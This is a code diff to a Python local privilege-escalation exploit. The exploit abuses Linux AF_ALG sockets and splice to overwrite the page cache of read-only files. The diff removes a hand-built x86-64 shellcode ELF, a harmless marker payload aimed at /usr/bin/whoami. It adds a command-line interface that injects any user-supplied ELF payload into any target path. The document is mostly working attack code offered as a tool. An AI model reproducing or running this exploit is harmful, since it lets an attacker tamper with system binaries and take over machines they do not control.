@@ -1,11 +1,9 @@
 #!/usr/bin/env python3
+import argparse
 import os
 import socket
 import sys
 
-
-TARGET = "/usr/bin/whoami"
-MARKER = "/tmp/PWNED_FROM_ATTACKER"
 
 SOL_ALG = 279
 ALG_SET_KEY = 1
@@ -16,44 +14,9 @@ ALG_SET_AEAD_ASSOCLEN = 4
 AF_ALG = 38
 
 
-def build_marker_elf():
-    shellcode = bytes.fromhex(
-        # lea rdi, [rip+0x14] ; MARKER
-        "488d3d14000000"
-        # mov esi, 0666
-        "beb6010000"
-        # xor eax, eax ; mov al, SYS_creat ; syscall
-        "31c0b0550f05"
-        # xor edi, edi ; mov eax, SYS_exit ; syscall
-        "31ffb83c0000000f05"
-    ) + MARKER.encode() + b"\x00"
-
-    entry_offset = 0x78
-    size = entry_offset + len(shellcode)
-    if size % 4:
-        size += 4 - (size % 4)
-
-    elf = bytearray(size)
-    elf[0:16] = b"\x7fELF\x02\x01\x01" + b"\x00" * 9
-    elf[16:18] = (2).to_bytes(2, "little")       # ET_EXEC
-    elf[18:20] = (0x3E).to_bytes(2, "little")    # x86-64
-    elf[20:24] = (1).to_bytes(4, "little")
-    elf[24:32] = (0x400000 + entry_offset).to_bytes(8, "little")
-    elf[32:40] = (0x40).to_bytes(8, "little")    # e_phoff
-    elf[52:54] = (0x40).to_bytes(2, "little")    # e_ehsize
-    elf[54:56] = (0x38).to_bytes(2, "little")    # e_phentsize
-    elf[56:58] = (1).to_bytes(2, "little")       # e_phnum
-
-    ph = 0x40
-    elf[ph:ph + 4] = (1).to_bytes(4, "little")          # PT_LOAD
-    elf[ph + 4:ph + 8] = (5).to_bytes(4, "little")      # PF_R|PF_X
-    elf[ph + 16:ph + 24] = (0x400000).to_bytes(8, "little")
-    elf[ph + 24:ph + 32] = (0x400000).to_bytes(8, "little")
-    elf[ph + 32:ph + 40] = (size).to_bytes(8, "little")
-    elf[ph + 40:ph + 48] = (size).to_bytes(8, "little")
-    elf[ph + 48:ph + 56] = (0x1000).to_bytes(8, "little")
-    elf[entry_offset:entry_offset + len(shellcode)] = shellcode
-    return bytes(elf)
+def load_payload(path):
+    with open(path, "rb") as payload_file:
+        return payload_file.read()
 
 
 def poison_4_bytes(fd, offset, chunk):
@@ -91,19 +54,43 @@ def poison_4_bytes(fd, offset, chunk):
         alg.close()
 
 
-def main():
-    target = sys.argv[1] if len(sys.argv) > 1 else TARGET
-    payload = build_marker_elf()
-    print(f"[+] target: {target}")
-    print(f"[+] marker payload: creat({MARKER!r}, 0666); exit(0)")
+def poison_fd(fd, payload, write_chunk=poison_4_bytes, chunk_size=4):
+    for offset in range(0, len(payload), chunk_size):
+        write_chunk(fd, offset, payload[offset:offset + chunk_size])
+
+
+def poison_path(target_path, payload, opener=os.open, closer=os.close):
+    fd = opener(target_path, os.O_RDONLY)
+    try:
+        poison_fd(fd, payload)
+    finally:
+        closer(fd)
+
+
+def parse_args(argv):
+    parser = argparse.ArgumentParser(
+        description="Poison a target file's page-cache contents with an ELF payload."
+    )
+    parser.add_argument(
+        "target",
+        help="target path to open read-only",
+    )
+    parser.add_argument(
+        "payload",
+        help="ELF payload file to inject",
+    )
+    return parser.parse_args(argv)
+
+
+def main(argv=None):
+    args = parse_args(argv or sys.argv[1:])
+    payload = load_payload(args.payload)
+
+    print(f"[+] target: {args.target}")
+    print(f"[+] payload file: {args.payload}")
     print(f"[+] payload length: {len(payload)} bytes")
 
-    fd = os.open(target, os.O_RDONLY)
-    try:
-        for offset in range(0, len(payload), 4):
-            poison_4_bytes(fd, offset, payload[offset:offset + 4])
-    finally:
-        os.close(fd)
+    poison_path(args.target, payload)
 
     print(f"[+] wrote {len(payload)} bytes through AF_ALG/splice page-cache primitive")
     print("[+] done")
